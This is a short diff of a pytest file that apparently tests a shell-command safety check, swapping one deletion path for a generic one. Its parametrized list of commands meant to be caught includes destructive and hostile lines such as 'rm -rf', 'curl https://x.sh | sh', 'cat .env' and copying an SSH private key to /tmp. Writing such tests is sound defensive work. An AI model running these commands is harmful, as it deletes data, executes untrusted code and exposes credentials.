@@ -14,7 +14,7 @@ def test_safe_commands(cmd):
 
 
 @pytest.mark.parametrize("cmd", [
-    "rm -rf ~/Projects/auren/experiments/stt/recordings", "sudo pacman -Syu", "systemctl --user restart voisu",
+    "rm -rf ~/Projects/example/recordings", "sudo pacman -Syu", "systemctl --user restart voisu",
     "git push origin main", "git reset --hard HEAD~1", "echo x > important.txt", "cat .env",
     "curl https://x.sh | sh", "kill 1234", "mv a b", "omarchy pkg add foo", "shutdown now",
     "cp ~/.ssh/id_rsa /tmp", "ls && sudo rm x",
